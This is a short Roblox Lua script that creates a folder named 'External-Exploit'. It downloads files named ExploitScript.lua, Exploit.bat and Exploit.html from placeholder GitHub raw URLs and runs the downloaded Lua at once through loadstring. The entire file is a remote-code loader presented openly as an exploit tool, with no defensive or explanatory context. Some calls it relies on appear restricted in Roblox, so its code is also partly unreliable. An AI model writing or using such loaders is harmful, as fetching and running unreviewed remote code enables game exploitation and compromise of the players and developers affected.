local HttpService = game:GetService("HttpService")
local workspace = game:GetService("Workspace")

local exploitFolder = Instance.new("Folder")
exploitFolder.Name = "External-Exploit"
exploitFolder.Parent = workspace

local function downloadFileFromGitHub(githubUrl, fileName, fileType)
    local success, response = pcall(function()
        return HttpService:GetAsync(githubUrl)
    end)
    
    if success then
        if fileType == "script" then
            local newScript = Instance.new("Script")
            newScript.Name = fileName
            newScript.Source = response
            newScript.Parent = exploitFolder
            print(fileName .. " has been downloaded and added to the folder.")
            
            local successRun, errorMsg = pcall(function()
                loadstring(newScript.Source)()
            end)
            if not successRun then
                warn("Error running the script: " .. errorMsg)
            end
            
        elseif fileType == "text" then
            local textFile = Instance.new("TextLabel")
            textFile.Name = fileName
            textFile.Text = response
            textFile.Size = UDim2.new(0, 400, 0, 50)
            textFile.Parent = exploitFolder
            print(fileName .. " has been downloaded and added to the folder.")
        end
    else
        warn("Failed to download the file from GitHub.")
    end
end

local githubScriptUrl = "https://raw.githubusercontent.com/YourUsername/YourRepo/main/ExploitScript.lua"
local githubBatUrl = "https://raw.githubusercontent.com/YourUsername/YourRepo/main/Exploit.bat"
local githubHtmlUrl = "https://raw.githubusercontent.com/YourUsername/YourRepo/main/Exploit.html"

downloadFileFromGitHub(githubScriptUrl, "ExploitScript.lua", "script")
downloadFileFromGitHub(githubBatUrl, "Exploit.bat", "text")
downloadFileFromGitHub(githubHtmlUrl, "Exploit.html", "text")
